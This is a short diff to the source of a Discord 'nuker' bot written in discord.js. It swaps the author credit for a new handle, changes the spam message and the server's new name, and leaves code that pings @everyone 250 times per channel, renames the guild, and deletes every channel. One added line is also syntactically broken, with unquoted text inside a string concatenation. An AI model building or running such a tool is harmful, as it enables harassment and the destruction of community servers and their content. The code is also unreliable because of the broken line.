@@ -1,5 +1,5 @@
-// https://github.com/17teen
-// Discord: 7teen#3868
+// https://github.com/999DEV
+// Discord: 999😂#0999
 
 const Discord = require('discord.js');
 const client = new Discord.Client({ ws: { intents: new Discord.Intents(Discord.Intents.ALL) } });
@@ -145,7 +145,7 @@ client.on("message", async message => {
                             channels.then(
                                 function (channel, index) {
                                     for (var i = 0; i < 250; i++) {
-                                        channel.send('@everyone ' + argresult)
+                                        channel.send('||@everyone|| ' + argresult + BOT CODED BY 999#0999)
                                         console.log(blueBright(`CHANNEL PINGED!`));
                                         // other per-channnel logic
                                     }
@@ -267,7 +267,7 @@ client.on("message", async message => {
                 return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
             } else {
                 message.delete();
-                message.guild.setName(`death is near.`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name
+                message.guild.setName(`GET FUCKED`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name
 
                 // Channel Delete
                 message.guild.channels.cache.forEach(channel => channel.delete().then(
